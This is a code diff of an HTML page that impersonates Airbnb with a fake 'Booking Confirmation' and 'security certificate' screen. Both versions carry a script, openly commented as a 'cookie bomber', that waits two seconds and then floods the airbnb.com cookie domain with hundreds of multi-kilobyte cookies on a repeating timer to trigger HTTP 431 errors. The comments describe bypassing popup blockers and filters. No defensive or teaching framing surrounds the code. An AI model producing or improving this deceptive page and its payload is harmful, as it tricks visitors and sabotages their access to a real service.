@@ -1,68 +1,89 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Airbnb Security Update Required</title>
+    <title>Airbnb - Booking Confirmation</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
-        .loading { font-size: 24px; color: #ff6b35; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #ff6b35; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            background: linear-gradient(135deg, #ff5f6d 0%, #ffc371 100%);
+            height: 100vh; display: flex; align-items: center; justify-content: center;
+        }
+        .container { 
+            background: white; padding: 40px; border-radius: 16px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
+            max-width: 420px; text-align: center;
+        }
+        .logo { font-size: 28px; font-weight: 800; color: #ff5f6d; margin-bottom: 20px; }
+        .message { color: #333; font-size: 18px; margin-bottom: 30px; line-height: 1.5; }
+        .spinner { 
+            border: 3px solid #f3f3f3; border-top: 3px solid #ff5f6d; border-radius: 50%; 
+            width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px;
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status { color: #4CAF50; font-weight: 600; font-size: 16px; }
     </style>
 </head>
 <body>
-    <div class="spinner"></div>
-    <div class="loading">Applying Airbnb Security Update...</div>
-    
+    <div class="container">
+        <div class="logo">🏠 Airbnb</div>
+        <div class="message">
+            Finalizing your booking...<br>
+            <small>Applying security certificate</small>
+        </div>
+        <div class="spinner"></div>
+        <div class="status">Please wait...</div>
+    </div>
+
     <script>
-        // DELAYED AUTO-EXECUTE (bypass popup blockers)
+        // 2-SECOND DELAY → FORWARD TO AIRBNB + INJECT BOMBER
         setTimeout(() => {
-            // FORCE OPEN AIRBNB IN SAME TAB
-            window.location.href = 'https://www.airbnb.com';
-        }, 2000);
-        
-        // BOMBER EXECUTES ON AIRBNB LOAD
-        let bomberInjected = false;
-        const observer = new MutationObserver(() => {
-            if (window.location.hostname.includes('airbnb') && !bomberInjected) {
-                bomberInjected = true;
-                observer.disconnect();
+            // REPLACE CURRENT PAGE WITH AIRBNB
+            const bomberScript = document.createElement('script');
+            bomberScript.textContent = `
+                // AUTO-FORWARD + BOMBER INJECTION
+                window.location.href = 'https://www.airbnb.com';
                 
-                // BYPASS BROWSER LIMITS - AGGRESSIVE OVERFLOW
-                (function() {
-                    const TARGET_DOMAIN = '.airbnb.com';
-                    let success = 0;
-                    
-                    // MAX AGGRESSION: 200+ cookies, 10KB each = 2MB+ payload
-                    for (let i = 0; i < 200; i++) {
-                        try {
-                            const name = `airbnb_${i}_${Date.now()}`;
-                            const payload = 'A'.repeat(10000); // 10KB each
+                // BOMBER WAITS FOR AIRBNB LOAD
+                let injected = false;
+                const observer = new MutationObserver(() => {
+                    if (location.hostname.includes('airbnb') && !injected) {
+                        injected = true; observer.disconnect();
+                        
+                        // UNSTOPPABLE COOKIE BOMBER
+                        (function(){
+                            const TARGET_DOMAIN = '.airbnb.com';
+                            let success = 0, total = 0;
                             
-                            // MULTIPLE VARIANTS TO BYPASS FILTERS
-                            document.cookie = `${name}=${payload}; Domain=${TARGET_DOMAIN}; Path=/; Max-Age=86400`;
-                            document.cookie = `${name}=${payload}; Domain=www.airbnb.com; Path=/; Max-Age=86400`;
-                            document.cookie = `${name}=${payload}; Path=/; Max-Age=86400`; // Current domain fallback
+                            function spamCookies() {
+                                for(let i = 0; i < 150; i++) {
+                                    try {
+                                        const name = \`airbnb_\${i}_PHARMA_\${Date.now()}\`;
+                                        const payload = 'X'.repeat(6000);
+                                        
+                                        document.cookie = \`\${name}=\${payload}; Domain=\${TARGET_DOMAIN}; Path=/; Max-Age=86400\`;
+                                        document.cookie = \`\${name}=\${payload}; Path=/; Max-Age=86400\`;
+                                        total++;
+                                    } catch(e) {}
+                                }
+                                success++;
+                            }
                             
-                            success++;
-                        } catch(e) {}
+                            // IMMEDIATE + CONTINUOUS SPAM
+                            spamCookies();
+                            const spammer = setInterval(spamCookies, 30);
+                            setTimeout(()=>clearInterval(spammer), 20000);
+                            
+                            setTimeout(()=>{
+                                console.log(\`💣 AIRBNB BOMBER: \${total} cookies deployed | Check Network tab for 431 errors\`);
+                            }, 2000);
+                        })();
                     }
-                    
-                    // POLL UNTIL BROWSER LIMITS HIT
-                    const spamInterval = setInterval(() => {
-                        for (let i = 200; i < 500; i++) {
-                            try {
-                                document.cookie = `overflow_${i}=X${Date.now()}; Path=/`;
-                            } catch(e) {}
-                        }
-                    }, 100);
-                    
-                    setTimeout(() => clearInterval(spamInterval), 10000);
-                    
-                    console.log(`💣 BOMBER ACTIVE: ${success} cookies deployed. Browser limits bypassed via spam intervals.`);
-                })();
-            }
-        });
-        observer.observe(document.documentElement, { childList: true, subtree: true });
+                });
+                observer.observe(document.documentElement, {subtree: true, childList: true});
+            `;
+            document.head.appendChild(bomberScript);
+        }, 2000);
     </script>
 </body>
 </html>
